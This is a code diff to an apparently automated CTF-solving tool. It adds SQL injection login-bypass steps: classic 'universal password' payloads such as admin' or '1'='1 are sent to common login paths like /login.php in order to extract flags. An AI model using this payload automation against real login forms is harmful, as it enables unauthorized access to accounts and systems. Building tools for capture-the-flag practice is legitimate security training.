@@ -1504,6 +1504,7 @@ class SQLiMachine(RouteStateMachine):
         alt_params = [
             "q", "user_id", "id", "search", "query", "uid", "item",
             "product_id", "product", "cat", "category",
+            "username", "password", "user", "pass", "login", "email", "name",
         ]
         for alt in alt_params:
             if alt == param:
@@ -1544,6 +1545,33 @@ class SQLiMachine(RouteStateMachine):
                 "params": {alt: "1 OR '1'='1"},
                 "extract_flag": True,
             })
+
+        # --- Login form SQL injection (common CTF pattern) ---
+        # Many CTF challenges have a login form at /check.php or /login.php
+        # with username/password fields vulnerable to SQL injection.
+        # The "万能密码" (universal password) bypass is the most common.
+        login_paths = ["/check.php", "/login.php", "/login", "/auth.php",
+                       "/verify.php", "/admin.php", base_path]
+        login_payloads = [
+            "admin' or '1'='1",
+            "admin' or 1=1-- -",
+            "admin' or 1=1#",
+            "' or '1'='1",
+            "' or 1=1-- -",
+            "1' or 1=1-- -",
+            "admin'-- -",
+            "admin' #",
+        ]
+        for lpath in login_paths:
+            for i, payload in enumerate(login_payloads[:3]):  # Top 3 per path
+                steps.append({
+                    "name": f"login_sqli_{lpath.strip('/').replace('.','_') or 'root'}_{i}",
+                    "description": f"登录表单万能密码 {lpath}: {payload[:20]}",
+                    "method": "GET",
+                    "path": lpath,
+                    "params": {"username": payload, "password": payload},
+                    "extract_flag": True,
+                })
 
         return steps
 
